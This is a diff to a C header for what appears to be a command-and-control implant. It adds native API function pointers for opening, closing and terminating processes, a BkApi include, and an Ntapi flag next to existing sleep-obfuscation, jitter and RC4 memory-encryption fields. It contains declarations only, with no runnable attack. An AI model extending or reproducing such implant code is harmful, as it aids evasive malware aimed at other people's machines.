@@ -12,6 +12,7 @@
 //
 #include <Native.h>
 #include <Macros.h>
+#include <BkApi.h>
 #include <Utils.h>
 #include <Package.h>
 #include <Transport.h>
@@ -92,7 +93,7 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
         NTSTATUS (NTAPI *NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
         NTSTATUS (NTAPI *NtSetInformationVirtualMemory)(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);
-
+        NTSTATUS (NTAPI *NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
         NTSTATUS (NTAPI *NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
         NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
         NTSTATUS (NTAPI *NtTestAlert)(void);
@@ -102,6 +103,8 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtAlertResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
         NTSTATUS (NTAPI *NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);
         NTSTATUS (NTAPI *NtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
+        NTSTATUS (NTAPI *NtClose)(HANDLE Handle);
+        NTSTATUS (NTAPI *NtTerminateProcess)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
 
         BOOL      (WINAPI *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
         NTSTATUS  (NTAPI *SystemFunction032)(struct USTRING* Img, struct USTRING* Key);
@@ -164,6 +167,7 @@ typedef struct _INSTANCE {
             DWORD  ProcessId;
             DWORD  ThreadId;
             PVOID  Heap;
+            BOOL   Ntapi;
             DWORD  SleepObf;
             DWORD  SleepTime;
             DWORD  Jitter;
